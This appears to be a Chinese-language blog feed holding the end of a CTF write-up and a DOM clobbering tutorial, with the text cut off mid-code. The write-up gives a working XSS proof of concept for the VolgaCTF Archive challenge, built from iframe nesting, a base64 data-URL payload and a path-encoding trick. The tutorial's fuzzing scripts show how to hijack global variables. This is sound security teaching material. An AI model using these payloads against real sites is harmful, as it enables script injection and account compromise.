&#x2F;(\&#x3D;)\?(&amp;|$)|\?\?&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.5.1 &#x2F;(\&#x3D;)\?(&amp;|$)|()\?\?()&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.4.4 &#x2F;\&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.4.2 &#x2F;&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.2.1 &#x2F;&#x3D;(\?|%3F)&#x2F;g</span><br><span class="line">&lt;  1.2   not supported</span><br></pre></td></tr></table></figure><p>所以我们完全可以不用考虑guid的传值，直接进行回调，并且??后面是可以接受任意其他字符的，如下：</p><p><img src="https://s1.ax1x.com/2020/04/01/GldVl8.png" alt="GldVl8.png"></p><p>都可成功回调</p><h3 id="VolgaCTF-Archive"><a href="#VolgaCTF-Archive" class="headerlink" title="VolgaCTF Archive"></a>VolgaCTF Archive</h3><p>蛮有趣的一道题</p><p>主要代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/pages.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  $(<span class="built_in">window</span>).on(<span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line">    volgactf.activePage.location=location.hash.slice(1);</span><br><span class="line">    if(volgactf.pages[volgactf.activePage.location]) &#123;</span><br><span class="line"><span class="javascript">      $(<span class="string">'#page'</span>).attr(<span class="string">'src'</span>,volgactf.pages[volgactf.activePage.location]);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.active'</span>).removeClass(<span class="string">'active'</span>);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.nav-item &gt; a:contains('</span>+volgactf.activePage.location+<span class="string">')'</span>).addClass(<span class="string">'active'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="javascript">  $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span>(location.hash.slice(<span class="number">1</span>) != <span class="string">'2019'</span>) &#123;</span></span><br><span class="line"><span class="javascript">      $(<span class="built_in">window</span>).trigger(<span class="string">'hashchange'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>page.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">volgactf = &#123;</span><br><span class="line">pages: &#123;</span><br><span class="line"><span class="string">'2011'</span>: <span class="string">'./html/2011.html'</span>,</span><br><span class="line"><span class="string">'2012'</span>: <span class="string">'./html/2012.html'</span>,</span><br><span class="line"><span class="string">'2013'</span>: <span class="string">'./html/2013.html'</span>,</span><br><span class="line"><span class="string">'2014'</span>: <span class="string">'./html/2014.html'</span>,</span><br><span class="line"><span class="string">'2015'</span>: <span class="string">'./html/2015.html'</span>,</span><br><span class="line"><span class="string">'2016'</span>: <span class="string">'./html/2016.html'</span>,</span><br><span class="line"><span class="string">'2017'</span>: <span class="string">'./html/2017.html'</span>,</span><br><span class="line"><span class="string">'2018'</span>: <span class="string">'./html/2018.html'</span>,</span><br><span class="line"><span class="string">'2019'</span>: <span class="string">'./html/2019.html'</span></span><br><span class="line">&#125;,</span><br><span class="line">activePage: &#123;</span><br><span class="line">location: <span class="number">2019</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要代码逻辑就是通过对page.js的加载更改location.hash切换页面</p><p>如果我们可以将 volgactf.activePage.location的值替换为javascript:alert(1)的话，即可造成xss攻击</p><p>所以目前要做的就是将volgactf.active覆盖为一个window对象，对于覆盖的实现可以使用Dom clobbering进行覆盖，不过volgactf.active在题目中已经是一个被声明的变量了，我们需要使这个变量变成未定义的状态，在旧版本的chrome中可以通过xss-auditor进行变量移除，不过在新版本中已经被删掉了。</p><p>但是在这个题目中可以通过另外的方式使得此变量变成未定义的模式，此变量的获取是通过page.js进行变量赋值的，我们可以通过一些手段使得Page.js无法成功加载达到此目的</p><p>大概有两种方法，如下：</p><ul><li>Nginx与浏览器的解析差异问题</li></ul><p>对于<a href="https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage</a></p><ul><li>通过斜线构造超长URL</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;              200 OK</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;js&#x2F;main.js    414 Request-URI Too Large</span><br></pre></td></tr></table></figure><p>触发414，同样无法成功加载page.js，进而得到未定义的volgactf.activePage</p><p>回归本体的攻击思路</p><ul><li>首先通过iframe引入<a href="https://archive.q.2020.volgactf.ru/x/..%2F（子页面）" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F（子页面）</a></li><li>构造frames[0].frames[0].location构造孙页面</li><li>孙页面的iframe设置name为activePage,并且将此页面的window.name设置为volgactf，此时相当于成功污染子页面的volgactf变量，最后将volgactf.activePage设置为与题目同域的window对象</li></ul><p>最后的利用Poc如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">  frames[<span class="number">0</span>].frames[<span class="number">0</span>].location=<span class="string">'data:text/html;base64,PGlmcmFtZSBuYW1lPWFjdGl2ZVBhZ2Ugc3JjPWh0dHBzOi8vYXJjaGl2ZS5xLjIwMjAudm9sZ2FjdGYucnUvP2FhYT48L2lmcmFtZT48c2NyaXB0PndpbmRvdy5uYW1lPSd2b2xnYWN0Zic7PC9zY3JpcHQ+'</span>;</span></span><br><span class="line"><span class="actionscript">  setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;frames[<span class="number">0</span>].location=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f#javascript:alert(document.domain)'</span>&#125;,<span class="number">1000</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;UserCenter&quot;&gt;&lt;a href=&quot;#UserCenter&quot; class=&quot;headerlink&quot; title=&quot;UserCenter&quot;&gt;&lt;/a&gt;UserCenter&lt;/h3&gt;&lt;p&gt;首先大概一下浏览基本功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆/注册&lt;/li&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DOM Clobbering Attack</title>
    <link href="http://yoursite.com/2020/04/15/DOM-Clobbering-Attack/"/>
    <id>http://yoursite.com/2020/04/15/DOM-Clobbering-Attack/</id>
    <published>2020-04-15T07:09:48.000Z</published>
    <updated>2020-04-15T07:10:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Dom-Clobbering-Attack概述"><a href="#Dom-Clobbering-Attack概述" class="headerlink" title="Dom Clobbering Attack概述"></a>Dom Clobbering Attack概述</h3><p>大概简述下这个技术的主要攻击手法：</p><p>通过标签中定义的name和id属性进行全局变量覆盖或劫持，进而造成其他通过全局变量实现效果的代码出现可控情况，造成漏洞。</p><h4 id="简单了解下id与name"><a href="#简单了解下id与name" class="headerlink" title="简单了解下id与name"></a>简单了解下id与name</h4><p><img src="https://s1.ax1x.com/2020/04/12/GO03h6.png" alt="GO03h6.png"></p><p>通过这种方式我们实现了全局变量的声明，不过有一点需要注意的是id无法通过document来获取，不过可以通过document.getElementById(‘test1’)或者document.querySelector(‘test1’)进行获取.</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="字符串的强制转换"><a href="#字符串的强制转换" class="headerlink" title="字符串的强制转换"></a>字符串的强制转换</h4><p>在利用时需要考虑两个问题：</p><p>第一个问题是：我们通过Dom clobbering覆盖的变量的值均是标签，也就是说都是一个HTMLElement对象，但是在实际应用的时候，很多时候变量都是按照字符串进行操作的，比如上面的例子中，如果直接进行字符串强制类型转换，将会产生下面的结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1)  <span class="comment">//[object HTMLImageElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以说我们需要找到即使被字符串强制类型转换后也能使用的标签，可利用如下代码进行下fuzz</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure><p>结果为得到HTMLAnchorElement和HTMLAreaElement.也就是对应了a标签和area标签</p><p>通过下面代码对这两个标签进行下测试</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">"http://test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">area</span> <span class="attr">id</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"http://test2"</span>&gt;</span><span class="tag">&lt;/<span class="name">area</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1) <span class="comment">// 返回结果http://test1</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test2) <span class="comment">// 返回结果http://test2</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从上面的测试结果来看a标签和area标签如果进行toString强制转换的时候，是会返回其href属性的value的</p><p>这里给下篇文章留个坑吧（可能是一篇关于Spidermonkey分析native code的文章）</p><h4 id="属性的访问"><a href="#属性的访问" class="headerlink" title="属性的访问"></a>属性的访问</h4><p>在javascript中属性的访问并不只有简单的x这种，更有a.b，a.b.c，甚至a.b.c.d这种的访问形式，下面的探讨就是对于这样问题的解决</p><h5 id="两层访问"><a href="#两层访问" class="headerlink" title="两层访问"></a>两层访问</h5><h6 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h6><p>第一种方法可以通过HTMLCollection的创建来实现两层访问</p><p>我们可以通过相同id的标签创建来实现HTMLCollection的创建，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test3.test4) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="Fuzz-Html-Tags"><a href="#Fuzz-Html-Tags" class="headerlink" title="Fuzz Html Tags"></a>Fuzz Html Tags</h6><p>在不构建HTMLCollection情况下，可以通过直接fuzz标签的关系，来确定是否可层级访问</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> log=[];</span><br><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>], logs = [];</span><br><span class="line">div=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;html.length;i++) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;html.length;j++) &#123;</span><br><span class="line">    div.innerHTML=<span class="string">'&lt;'</span>+html[i]+<span class="string">' id=element1&gt;'</span>+<span class="string">'&lt;'</span>+html[j]+<span class="string">' id=element2&gt;'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.element1 &amp;&amp; element1.element2)&#123;</span><br><span class="line">       log.push(html[i]+<span class="string">','</span>+html[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log.join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure><p>可得到如下关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form,button</span><br><span class="line">form,fieldset</span><br><span class="line">form,image</span><br><span class="line">form,img</span><br><span class="line">form,input</span><br><span class="line">form,object</span><br><span class="line">form,output</span><br><span class="line">form,select</span><br><span class="line">form,textarea</span><br></pre></td></tr></table></figure><p>测试代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不过这种是无法触发字符串的访问的，相对上种方法更局限一些</p><h5 id="三层访问"><a href="#三层访问" class="headerlink" title="三层访问"></a>三层访问</h5><p>对于三层的访问来讲，其实就是两种两层访问方法的叠加</p><p>测试代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(test1.test2.test3) <span class="comment">//&lt;button id=test3&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到返回结果为上面声明的id为test3的button标签</p><h5 id="三层以上访问"><a href="#三层以上访问" class="headerlink" title="三层以上访问"></a>三层以上访问</h5><p>三层以上的访问可以通过iframe与srcdoc来实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(a.b.c.d),<span class="number">500</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果不想通过setTimeout进行延时的话，还可以通过<code>&lt;style&gt;</code>标签或者<code>&lt;script&gt;</code>等进行网络请求造成延时，使得iframe加载完毕</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">    &lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//test.net"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(a.b.c.d)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="任意属性测试"><a href="#任意属性测试" class="headerlink" title="任意属性测试"></a>任意属性测试</h4><p>上面的测试一直是针对id与name进行测试的，但是dom中还有其他很多属性，下面是对于String类型并且可读可写的属性进行fuzz：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [...]<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line"><span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span 